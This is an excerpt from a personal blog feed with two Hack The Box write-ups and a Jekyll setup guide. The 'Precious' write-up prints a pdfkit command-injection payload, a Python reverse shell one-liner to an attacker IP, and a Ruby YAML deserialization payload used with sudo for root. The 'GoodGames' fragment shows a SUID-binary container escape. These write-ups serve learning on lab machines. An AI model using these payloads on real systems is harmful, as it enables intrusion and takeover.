+ECDSA key fingerprint is SHA256:AvB4qtTxSVcB0PuHwoPV42/LAJ9TlyPVbd7G6Igzmj0.
+Are you sure you want to continue connecting (yes/no)? yes
+yes
+Warning: Permanently added '172.19.0.1' (ECDSA) to the list of known hosts.
+augustus@172.19.0.1's password: superadministrator 
+
+Linux GoodGames 4.19.0-18-amd64 #1 SMP Debian 4.19.208-1 (2021-09-29) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+augustus@GoodGames:~$ 
+</code></pre></div></div>
+
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<p>Looking at the output of <code class="language-plaintext highlighter-rouge">ps aux</code>, I noticed something a bit suspicious. Although I wasn’t entirely familiar with how Docker containers functioned in correlation with their host machines, I knew this was odd. All the commands being run on the container were being run as <code class="language-plaintext highlighter-rouge">root</code> on the host machine!</p>
+
+<p><img src="/_assets/images/writeups/goodgames/everythingroot.png" alt="" /></p>
+
+<p>It’s a bit hard to see, but the Python interactive shell command I just ran is being run as <code class="language-plaintext highlighter-rouge">root</code>. Knowing this, my thought and step process was the following:</p>
+<ol class="numbered-list">
+  <li>Go back into the container</li>
+</ol>
+
+<ol start="2" class="numbered-list">
+  <li>Copy a <code class="language-plaintext highlighter-rouge">cat</code> binary into the mounted user <code class="language-plaintext highlighter-rouge">augustus</code> directory which would be owned by <code class="language-plaintext highlighter-rouge">root</code></li>
+</ol>
+<p><code class="language-plaintext highlighter-rouge">cp /usr/bin cat</code></p>
+
+<p><img src="/_assets/images/writeups/goodgames/catbinary.png" alt="" /></p>
+
+<ol start="3" class="numbered-list">
+  <li>Set the SUID 
+Set the SUID on the binary to allow execution as <code class="language-plaintext highlighter-rouge">root</code> despite not being <code class="language-plaintext highlighter-rouge">root</code></li>
+</ol>
+<p><code class="language-plaintext highlighter-rouge">chmod +s cat</code></p>
+
+<p><img src="/_assets/images/writeups/goodgames/catbinary.png" alt="" /></p>
+
+<ol start="4" class="numbered-list">
+  <li>SSH 
+SSH in back into the host machine and read <code class="language-plaintext highlighter-rouge">/root/root.txt</code> <strong>with the mounted <code class="language-plaintext highlighter-rouge">cat</code> binary</strong>
+<code class="language-plaintext highlighter-rouge">/home/augustus/cat /root/root.txt</code></li>
+</ol>
+
+<p><img src="/_assets/images/writeups/goodgames/root.png" alt="" /></p>]]></content><author><name>soh3ee</name></author><category term="writeups" /><summary type="html"><![CDATA[GoodGames was an easy rated box featuring a login page that called unsanitized queries and server side template injection (SSTI). I feel like this box reinforces your fundamentals such as using automated tooling like SQLmap, being weary of any data entry fields, and a touch into the concept of containers (I had never escaped one before this box!). TCP Nmap Scan]]></summary></entry><entry><title type="html">Precious Writeup</title><link href="http://localhost:4000/writeups/precious" rel="alternate" type="text/html" title="Precious Writeup" /><published>2023-03-24T07:44:00-07:00</published><updated>2023-03-24T07:44:00-07:00</updated><id>http://localhost:4000/writeups/precious</id><content type="html" xml:base="http://localhost:4000/writeups/precious"><![CDATA[<h3 id="tcp-nmap-scan">TCP Nmap Scan</h3>
+<div class="language-lua highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">#</span> <span class="n">Nmap</span> <span class="mi">7</span><span class="p">.</span><span class="mi">93</span> <span class="n">scan</span> <span class="n">initiated</span> <span class="n">Mon</span> <span class="n">Feb</span> <span class="mi">20</span> <span class="mi">17</span><span class="p">:</span><span class="mi">17</span><span class="p">:</span><span class="mi">13</span> <span class="mi">2023</span> <span class="n">as</span><span class="p">:</span> <span class="n">nmap</span> <span class="o">-</span><span class="n">p</span><span class="o">-</span> <span class="o">-</span><span class="n">sCV</span> <span class="c1">--min-rate=10000 -o preciousnmap.txt 10.10.11.189</span>
+<span class="n">Warning</span><span class="p">:</span> <span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">11</span><span class="p">.</span><span class="mi">189</span> <span class="n">giving</span> <span class="n">up</span> <span class="n">on</span> <span class="n">port</span> <span class="n">because</span> <span class="n">retransmission</span> <span class="n">cap</span> <span class="n">hit</span> <span class="p">(</span><span class="mi">10</span><span class="p">).</span>
+<span class="n">Nmap</span> <span class="n">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="n">precious</span><span class="p">.</span><span class="n">htb</span> <span class="p">(</span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">11</span><span class="p">.</span><span class="mi">189</span><span class="p">)</span>
+<span class="n">Host</span> <span class="n">is</span> <span class="n">up</span> <span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">090</span><span class="n">s</span> <span class="n">latency</span><span class="p">).</span>
+<span class="n">Not</span> <span class="n">shown</span><span class="p">:</span> <span class="mi">65257</span> <span class="n">closed</span> <span class="n">tcp</span> <span class="n">ports</span> <span class="p">(</span><span class="n">conn</span><span class="o">-</span><span class="n">refused</span><span class="p">),</span> <span class="mi">276</span> <span class="n">filtered</span> <span class="n">tcp</span> <span class="n">ports</span> <span class="p">(</span><span class="n">no</span><span class="o">-</span><span class="n">response</span><span class="p">)</span>
+<span class="n">PORT</span>   <span class="n">STATE</span> <span class="n">SERVICE</span> <span class="n">VERSION</span>
+<span class="mi">22</span><span class="o">/</span><span class="n">tcp</span> <span class="n">open</span>  <span class="n">ssh</span>     <span class="n">OpenSSH</span> <span class="mi">8</span><span class="p">.</span><span class="mi">4</span><span class="n">p1</span> <span class="n">Debian</span> <span class="mi">5</span><span class="o">+</span><span class="n">deb11u1</span> <span class="p">(</span><span class="n">protocol</span> <span class="mi">2</span><span class="p">.</span><span class="mi">0</span><span class="p">)</span>
+<span class="err">|</span> <span class="n">ssh</span><span class="o">-</span><span class="n">hostkey</span><span class="p">:</span> 
+<span class="err">|</span>   <span class="mi">3072</span> <span class="mf">845e13</span><span class="n">a8e31e20661d235550f63047d2</span> <span class="p">(</span><span class="n">RSA</span><span class="p">)</span>
+<span class="err">|</span>   <span class="mi">256</span> <span class="n">a2ef7b9665ce4161c467ee4e96c7c892</span> <span class="p">(</span><span class="n">ECDSA</span><span class="p">)</span>
+<span class="err">|</span><span class="n">_</span>  <span class="mi">256</span> <span class="mi">33053</span><span class="n">dcd7ab798458239e7ae3c91a658</span> <span class="p">(</span><span class="n">ED25519</span><span class="p">)</span>
+<span class="mi">80</span><span class="o">/</span><span class="n">tcp</span> <span class="n">open</span>  <span class="n">http</span>    <span class="n">nginx</span> <span class="mi">1</span><span class="p">.</span><span class="mi">18</span><span class="p">.</span><span class="mi">0</span>
+<span class="err">|</span><span class="n">_http</span><span class="o">-</span><span class="n">title</span><span class="p">:</span> <span class="n">Convert</span> <span class="n">Web</span> <span class="n">Page</span> <span class="n">to</span> <span class="n">PDF</span>
+<span class="err">|</span> <span class="n">http</span><span class="o">-</span><span class="n">server</span><span class="o">-</span><span class="n">header</span><span class="p">:</span> 
+<span class="err">|</span>   <span class="n">nginx</span><span class="o">/</span><span class="mi">1</span><span class="p">.</span><span class="mi">18</span><span class="p">.</span><span class="mi">0</span>
+<span class="err">|</span><span class="n">_</span>  <span class="n">nginx</span><span class="o">/</span><span class="mi">1</span><span class="p">.</span><span class="mi">18</span><span class="p">.</span><span class="mi">0</span> <span class="o">+</span> <span class="n">Phusion</span> <span class="n">Passenger</span><span class="p">(</span><span class="n">R</span><span class="p">)</span> <span class="mi">6</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">15</span>
+<span class="n">Service</span> <span class="n">Info</span><span class="p">:</span> <span class="n">OS</span><span class="p">:</span> <span class="n">Linux</span><span class="p">;</span> <span class="n">CPE</span><span class="p">:</span> <span class="n">cpe</span><span class="p">:</span><span class="o">/</span><span class="n">o</span><span class="p">:</span><span class="n">linux</span><span class="p">:</span><span class="n">linux_kernel</span>
+
+<span class="n">Service</span> <span class="n">detection</span> <span class="n">performed</span><span class="p">.</span> <span class="n">Please</span> <span class="n">report</span> <span class="n">any</span> <span class="n">incorrect</span> <span class="n">results</span> <span class="n">at</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="p">.</span><span class="n">org</span><span class="o">/</span><span class="n">submit</span><span class="o">/</span> <span class="p">.</span>
+<span class="o">#</span> <span class="n">Nmap</span> <span class="n">done</span> <span class="n">at</span> <span class="n">Mon</span> <span class="n">Feb</span> <span class="mi">20</span> <span class="mi">17</span><span class="p">:</span><span class="mi">17</span><span class="p">:</span><span class="mi">35</span> <span class="mi">2023</span> <span class="c1">-- 1 IP address (1 host up) scanned in 21.95 seconds</span>
+</code></pre></div></div>
+
+<p>The website has a text input box, and the purpose of it is to convert web pages to PDF files. I started playing around with it:</p>
+
+<p><code class="language-plaintext highlighter-rouge">10.10.11.189</code> returned <code class="language-plaintext highlighter-rouge">You should provide a valid URL!</code>.
+<code class="language-plaintext highlighter-rouge">http://10.10.11.189</code> returned <code class="language-plaintext highlighter-rouge">Cannot load remote URL!</code>. Okay, so I can assume it’s expecting a <code class="language-plaintext highlighter-rouge">http://</code> format, especially considering that it was expecting a URL and it changed its output.</p>
+
+<p><img src="/_assets/images/writeups/precious/img1.png" alt="" /></p>
+
+<p>So I couldn’t access the web page of itself, so how about another IP on its network? How about me? So I spun up my own web server with the Python http.server module: <code class="language-plaintext highlighter-rouge">python3 -m http.server 80 </code></p>
+<ul>
+  <li>It’s important to specify port 80 because the default port for Python’s http.server is 8080, and that’s not what the website is expecting.</li>
+</ul>
+
+<p>I inputted my own (VPN) IP in the <code class="language-plaintext highlighter-rouge">http://</code> format: <code class="language-plaintext highlighter-rouge">http://10.10.14.4</code>, and what do you know, it created a PDF of my web page :)</p>
+
+<p><img src="/_assets/images/writeups/precious/img2.png" alt="" /></p>
+
+<p>Now that I had something new to work with, I wanted to know more about this file. I ran a common file forensics tool called <code class="language-plaintext highlighter-rouge">exiftool</code> on the file: 
+<code class="language-plaintext highlighter-rouge">exiftool fo99la37ukytqmhduq8elzoqbudbyvu9.pdf </code></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ExifTool Version Number         : 12.52
+File Name                       : fo99la37ukytqmhduq8elzoqbudbyvu9.pdf
+Directory                       : .
+File Size                       : 36 kB
+File Modification Date/Time     : 2023:02:20 16:39:42-08:00
+File Access Date/Time           : 2023:02:20 16:40:16-08:00
+File Inode Change Date/Time     : 2023:02:20 16:39:42-08:00
+File Permissions                : -rw-r--r--
+File Type                       : PDF
+File Type Extension             : pdf
+MIME Type                       : application/pdf
+PDF Version                     : 1.4
+Linearized                      : No
+Page Count                      : 1
+Creator                         : Generated by pdfkit v0.8.6
+</code></pre></div></div>
+
+<p>The important line here is <code class="language-plaintext highlighter-rouge">Creator: Generated by pdfkit v0.8.6</code>
+This immediately sparked my eye, mainly because it had a version number which is important when searching for valid exploits. I searched <code class="language-plaintext highlighter-rouge">pdfkit v0.8.6 exploits</code> and the first thing that popped up was “Command Injection in pdfkit | CVE-2022-25765”.</p>
+
+<p>After looking through this exploit’s documentation, all I had to do was establish a parameter containing a URL encoded character, and specify the shell command I wanted it to execute: ``http://10.10.14.4?bruh=%20<code class="language-plaintext highlighter-rouge">id</code></p>
+
+<p><img src="/_assets/images/writeups/precious/img3.png" alt="" /></p>
+
+<ul>
+  <li>One important think I learned is that when I need to type tedious things, just copy and paste T_T. I’m a fast typer, and a pretty accurate one too, but sometimes even a single typo can invalidate your exploit. After all, exploits are usually unusual vulnerabilities</li>
+</ul>
+
+<p>After inputting this to the site, I was returned a pdf that displayed my user id. Confirming that code injection worked, I chose to establish a reverse shell using Python: 
+When establishing a reverse shell, you want to have a listener on your attacking machine, and for your victim machine to execute code that will establish remote connection to <strong>you</strong>.</p>
+
+<p>I had checked Python was on the box with: ``http://10.10.14.4?bruh=%20<code class="language-plaintext highlighter-rouge">which python3</code></p>
+
+<p><img src="/_assets/images/writeups/precious/img4.png" alt="" /></p>
+
+<p>Listener on attacking machine: <code class="language-plaintext highlighter-rouge">nc -lvnp 6666</code> - * <em>You can choose any port number, I just like 6666 (:</em> *</p>
+
+<p>Code to be executed on victim machine: <code class="language-plaintext highlighter-rouge">python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("10.10.14.4",6666));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'</code></p>
+
+<p>Formatted string to the input box on the website that is vulnerable to code injection, therefore will run the above command: <code class="language-plaintext highlighter-rouge">http://10.10.14.4?bruh=%20`python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("10.10.14.4",6666));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'</code></p>
+
+<p>And just like that, after sending that request to the page, I got a shell in my terminal.</p>
+
+<p><img src="/_assets/images/writeups/precious/img5.png" alt="" /></p>
+
+<h4 id="privilege-escalation">Privilege Escalation</h4>
+<p>I had access to the machine, but I was user <code class="language-plaintext highlighter-rouge">ruby</code>. I explored my scope by <code class="language-plaintext highlighter-rouge">cd</code>ing around, but what I had needed was right there in my home directory the entire time. <code class="language-plaintext highlighter-rouge">ls -lah</code> revealed the <code class="language-plaintext highlighter-rouge">.bundle</code> directory. In this directory was a file named <code class="language-plaintext highlighter-rouge">config</code>, in which <code class="language-plaintext highlighter-rouge">cat config</code> revealed creds to the user <code class="language-plaintext highlighter-rouge">henry</code>.</p>
+
+<p><img src="/_assets/images/writeups/precious/img6.png" alt="" /></p>
+
+<p>I always <code class="language-plaintext highlighter-rouge">ssh</code> into new users if possible, because I want a fully interactive shell. I <code class="language-plaintext highlighter-rouge">ssh</code>d into user <code class="language-plaintext highlighter-rouge">henry</code> and from here I got the user hash in <code class="language-plaintext highlighter-rouge">user.txt</code>.</p>
+
+<p><img src="/_assets/images/writeups/precious/img7.png" alt="" /></p>
+
+<p>From here, the next and last step was getting <code class="language-plaintext highlighter-rouge">root</code>. The first thing I ran was <code class="language-plaintext highlighter-rouge">sudo -l</code> and what do ya know, I can run a certain command as root :)</p>
+
+<p><img src="/_assets/images/writeups/precious/img8.png" alt="" /></p>
+
+<p>Now I’m not pro at ruby; actually, I know essentially nothing about ruby. But I tried running this command, and it gave me an error output:</p>
+
+<p><img src="/_assets/images/writeups/precious/img9.png" alt="" /></p>
+
+<p>It was telling me that on execution, ruby was expecting <code class="language-plaintext highlighter-rouge">dependencies.yml</code>. Although the other paths were absolute file paths, I assumed that the <code class="language-plaintext highlighter-rouge">dependencies.yml</code> was a relative file path to my home directory. So to test this out, I created <code class="language-plaintext highlighter-rouge">dependencies.yml</code> in my home directory. Then I tried running it again. This time I got a different output:</p>
+
+<p><img src="/_assets/images/writeups/precious/img10.png" alt="" /></p>
+
+<p>This told me that this was the file that it was looking for. Now, how could I escalate my privilege with this?</p>
+
+<p>I read up on what <code class="language-plaintext highlighter-rouge">dependencies.yml</code> typically contains in the context of <code class="language-plaintext highlighter-rouge">ruby</code>. The more I thought about it, the more I realized that I could possibly achieve code exeuction through this file, as the command indeed was reading the file: <code class="language-plaintext highlighter-rouge">YAML.load(File.read("dependencies.yml"))</code></p>
+
+<p><img src="/_assets/images/writeups/precious/img11.png" alt="" /></p>
+
+<p>So I searched for <code class="language-plaintext highlighter-rouge">ruby yaml exploits</code> and oh wow, there’s an exploit that perfectly does what I want it to do (: %%I learned that this kind of exploit is called deserialization%%</p>
+
+<p>https://blog.stratumsecurity.com/2021/06/09/blind-remote-code-execution-through-yaml-deserialization</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> ---
+ - !ruby/object:Gem::Installer
+     i: x
+ - !ruby/object:Gem::SpecFetcher
+     i: y
+ - !ruby/object:Gem::Requirement
+   requirements:
+     !ruby/object:Gem::Package::TarReader
+     io: &amp;1 !ruby/object:Net::BufferedIO
+       io: &amp;1 !ruby/object:Gem::Package::TarReader::Entry
+          read: 0
+          header: "abc"
+       debug_output: &amp;1 !ruby/object:Net::WriteAdapter
+          socket: &amp;1 !ruby/object:Gem::RequestSet
+              sets: !ruby/object:Net::WriteAdapter
+                  socket: !ruby/module 'Kernel'
+                  method_id: :system
+              git_set: id
+          method_id: :resolve
+</code></pre></div></div>
+
+<p>The important line here is <code class="language-plaintext highlighter-rouge">git_set</code>, the parameter where I specify the shell command I want executed. I copied and pasted this into <code class="language-plaintext highlighter-rouge">dependencies.yml</code>. I tried <code class="language-plaintext highlighter-rouge">id</code> initially, in which I got <code class="language-plaintext highlighter-rouge">henry</code>’s id returned to me. I tried running it with <code class="language-plaintext highlighter-rouge">sudo</code>, and I got <code class="language-plaintext highlighter-rouge">root</code>’s id returned to me!</p>
+
+<p><img src="/_assets/images/writeups/precious/img12.png" alt="" /></p>
+
+<p><img src="/_assets/images/writeups/precious/img13.png" alt="" /></p>
+
+<p>And the last step was running a shell command that would get me to <code class="language-plaintext highlighter-rouge">root</code>. I changed <code class="language-plaintext highlighter-rouge">git_set: id</code> to <code class="language-plaintext highlighter-rouge">git_set: su</code>. Then I executed the command again with <code class="language-plaintext highlighter-rouge">sudo</code>.</p>
+
+<p><img src="/_assets/images/writeups/precious/img14.png" alt="" /></p>
+
+<p>Bing bang boom, <code class="language-plaintext highlighter-rouge">root</code> :P
+<img src="/_assets/images/writeups/precious/img15.png" alt="" /></p>
+
+<p>Something kinda fun I want to point out is how ruby is an interpreted language, meaning that the code runs line by line as it is interpreted into machine language. It is only when it encounters an error that it then stops running. This is why the code was able to run and provide me the output of <code class="language-plaintext highlighter-rouge">id</code> and even execute <code class="language-plaintext highlighter-rouge">su</code>, while returning error messages afterwards.</p>]]></content><author><name>soh3ee</name></author><category term="writeups" /><summary type="html"><![CDATA[TCP Nmap Scan ```lua Nmap 7.93 scan initiated Mon Feb 20 17:17:13 2023 as: nmap -p- -sCV –min-rate=10000 -o preciousnmap.txt 10.10.11.189 Warning: 10.10.11.189 giving up on port because retransmission cap hit (10). Nmap scan report for precious.htb (10.10.11.189) Host is up (0.090s latency). Not shown: 65257 closed tcp ports (conn-refused), 276 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0) | ssh-hostkey: | 3072 845e13a8e31e20661d235550f63047d2 (RSA) | 256 a2ef7b9665ce4161c467ee4e96c7c892 (ECDSA) |_ 256 33053dcd7ab798458239e7ae3c91a658 (ED25519) 80/tcp open http nginx 1.18.0 |http-title: Convert Web Page to PDF | http-server-header: | nginx/1.18.0 | nginx/1.18.0 + Phusion Passenger(R) 6.0.15 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel]]></summary></entry><entry><title type="html">Setting Up Jekyll With Github Pages</title><link href="http://localhost:4000/programming/setting-up-jekyll-with-github-pages" rel="alternate" type="text/html" title="Setting Up Jekyll With Github Pages" /><published>2023-03-24T07:44:00-07:00</published><updated>2023-03-24T07:44:00-07:00</updated><id>http://localhost:4000/programming/setting-up-jekyll-with-github-pages</id><content type="html" xml:base="http://localhost:4000/programming/setting-up-jekyll-with-github-pages"><![CDATA[<p>As someone who loves web development, Jekyll was an enjoyable and low-key addicting experience, espeically throughout my spring break. Here’s a quick guide on how to get started with Jekyll locally and eventually hosting it through Github Pages.</p>
+
+<!-- Since I found initially understanding Jekyll's rendering process and Liquid formatting the most confusing, here's a simple post that might help you get started. -->
+<!-- As someone who enjoys web development, working on my site powered by Jekyll was an enjoyable and low-key addicting experience. As soon as spring break hit, I began to design my site. Unsatisifed with the idea of using another person's theme or templates, I decided to design my own. Although my friends said I was crazy, I worked throughout my spring break nights to produce this website. It ain't much, but it's honest work. So here's how you can do it too! ʘ‿ʘ -->
+
+<h2 id="getting-started-locally">Getting Started Locally</h2>
+<p>Eventually, you will push your changes to a Github repository with the name format: <code class="language-plaintext highlighter-rouge">&lt;your_github_username&gt;@github.site.io</code>. But before that, you’re going to need to have something to push to the repository. You’re also going to need to be able to test these changes easily, especially for something like web development. (Could you imagine pushing to your repository and waiting for Github to build your entire page to check if your div was centered? (๏  。๏))</p>
+
+<ol class="numbered-list">
+  <li>
+    <h3 id="installing-jekyll">Installing Jekyll</h3>
+  </li>
+</ol>
+
+<p><a href="https://jekyllrb.com/docs/installation/" class="bold underline">Jekyll’s documentation on the installation process</a> has clear and detailed instructions for different operating systems.</p>
+
+<ol start="2" class="numbered-list">
+  <li>
+    <h3 id="create-a-page-directory">Create a Page Directory</h3>
+  </li>
+</ol>
+
+<p><em>My tutorial will be in reference to Linux/MacOS, although I these steps apply similarly to a Windows machine.</em> 
+In your terminal:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>// creating local directory
+mkdir &lt;your_github_username&gt;@github.site.io
+cd &lt;your_githu_username&gt;@github.site.io
+
+// initializing our directory with Jekyll's default content 
+jekyll new .
+</code></pre></div></div>
+<p>And that’s basically it! If you run <code class="language-plaintext highlighter-rouge">bundle exec jekyll serve</code>, you should be able to navigate to <code class="language-plaintext highlighter-rouge">http://localhost:4000</code> to see your locally hosted site.</p>
+
+<p>But obviously we want some customization, ay? You can read about that <a href="here" class="bold underline">here</a>.</p>
+
+<!-- ## understanding jekyll
+The files that populate your directory may not make sense at first, so here's the visual hierarchy along with some descriptions. It's best to note that understanding how Jekyll renders your site and what it looks for while doing so will you save you hours of troubleshooting, I promise. ミ●﹏☉ミ
+```  
+.
+├── 404.html // the page displayed when a 404 error occurs; e.g. page not found
+├── Gemfile // file where you specify what gems and versions you want installed
+├── Gemfile.lock // tbh no idea, don't really have to touch this
+├── _config.yml // super important. where you specify site-wide variables
+├── _posts // where all your posts go
+│   └── 2023-04-01-welcome-to-jekyll.markdown
+├── _site // where Jekyll places your RENDERED site; don't make changes here.
+│   ├── 404.html
+│   ├── about
+│   │   └── index.html
+│   ├── assets
+│   │   ├── main.css
+│   │   ├── main.css.map
+│   │   └── minima-social-icons.svg
+│   ├── feed.xml
+│   ├── index.html
+│   └── jekyll
+│       └── update
+│           └── 2023
+│               └── 04
+│                   └── 01
+│                       └── welcome-to-jekyll.html
+├── about.markdown // sample about page
+└── index.markdown // sample index page
+```
+You'll notice that `_site` is essentially a copy of your source directory. That's because after Jekyll renders your site, it puts the final product into `_site`. Think of it as putting the puzzle pieces of your site together, since you'll eventually have various layouts and include files you'll want to dynamically populate your site, rather than doing everything manually.
+
+
+
+Some extra directories you'll want to create are `_layouts`, `_assets`, `_includes` and `_sass`. This is what your final directory should look like, alongside which I've provided the new directory descriptions.
+
+```
+.
+├── 404.html
+├── Gemfile
+├── Gemfile.lock
+├── _assets // usually contains images, css, and js files
+├── _config.yml
+├── _includes // usually contains templated partials, but don't fall under layout templates 
+├── _layouts // layout templates for your different layouts 
+├── _posts
+│   └── 2023-04-01-welcome-to-jekyll.markdown
+├── _sass // where your sass/scss files will go
+├── _site
+│   ├── 404.html
+│   ├── about
+│   │   └── index.html
+│   ├── assets
+│   │   ├── main.css
+│   │   ├── main.css.map
+│   │   └── minima-social-icons.svg
+│   ├── feed.xml
+│   ├── index.html
+│   └── jekyll
+│       └── update
+│           └── 2023
+│               └── 04
+│                   └── 01
+│                       └── welcome-to-jekyll.html
+├── about.markdown
+└── index.markdown
+```
+
+### _config.yml
+Modify these site variables to your fit. Most of these variables aren't explicitly necessary, for example, `twitter_username`, but they are variables you can call later on in your posts using Liquid format, and also variables that Jekyll might use such as `baseurl` and `url`. 
+```
+title: Your awesome title
+email: your-email@example.com
+description: >- # this means to ignore newlines until "baseurl:"
+  Write an awesome description for your new site here. You can edit this
+  line in _config.yml. It will appear in your document head meta (for
+  Google search results) and in your feed.xml site description.
+baseurl: "" # the subpath of your site, e.g. /blog
+url: "" # the base hostname & protocol for your site, e.g. http://example.com
+twitter_username: jekyllrb
+github_username:  jekyll
+``` -->
+
+<h3 id="gemfile">Gemfile</h3>
+<p>To configure your Gemfile to work with Github Pages, uncomment the following line by deleting the <code class="language-plaintext highlighter-rouge">#</code>:</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># gem "github-pages", group: :jekyll_plugins</span>
+</code></pre></div></div>
+<p>When you try hosting your page with <code class="language-plaintext highlighter-rouge">bundle exec jekyll serve</code>, but get this issue:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Could not find compatible versions
+
+Because every version of github-pages depends on jekyll = 3.9.3
+  and Gemfile depends on jekyll ~&gt; 4.3.2,
+  github-pages cannot be used.
+So, because Gemfile depends on github-pages &gt;= 0,
+  version solving has failed.
+</code></pre></div></div>
+<p>modify your Gemfile so that the Jekyll version it is looking for is not 4.3.2, but 3.9.3, or whatever version shows up on your end.</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">gem</span> <span class="s2">"jekyll"</span><span class="p">,</span> <span class="s2">"~&gt; 3.9.3"</span>
+</code></pre></div></div>
+
+<p>You may also undergo this issue:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cannot load such file -- webrick (LoadError)
+</code></pre></div></div>
+<p>Of which you can just issue <code class="language-plaintext highlighter-rouge">bundle add webrick</code>.</p>
+
+<h2 id="verifying-site-build-on-github-pages">Verifying Site Build on Github Pages</h2>
+<p>Create your site repository on Github. To do this, navigate to <a href="https://github.com">Github</a> and click <code class="language-plaintext highlighter-rouge">New Repository</code> at the top right corner over the <code class="language-plaintext highlighter-rouge">+</code> icon. 
+<img src="/_assets/images/programming/settingUpJekyllWithGithubPages/githubAddRepo.png" alt="" /></p>
+
+<p>Name it exactly like so: <code class="language-plaintext highlighter-rouge">&lt;your_github_username&gt;.github.io</code>
+<img src="/_assets/images/programming/settingUpJekyllWithGithubPages/githubRepoName.png" alt="" />
+<em>Mine already exists, which is why it’s red.</em></p>
+
+<p>From here, return to your terminal and source directory, and invoke the following commands:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git init
+git commit -m "first commit wazzoo"
+git branch -M main
+git remote add origin https://github.com/&lt;your_github_user&gt;/&lt;your_site_repo&gt;.git
+git push -U origin main
+</code></pre></div></div>
+<p class="post-bottom-margin">As soon as it pushes, Github should immediately start building your site. And there you have it! Your initial Jekyll setup is complete. If you want to learn about further customization, styling, and understand how Jekyll works, feel free to check out my other posts.</p>]]></content><author><name>soh3ee</name></author><category term="programming" /><summary type="html"><![CDATA[As someone who loves web development, Jekyll was an enjoyable and low-key addicting experience, espeically throughout my spring break. Here’s a quick guide on how to get started with Jekyll locally and eventually hosting it through Github Pages.]]></summary></entry></feed>
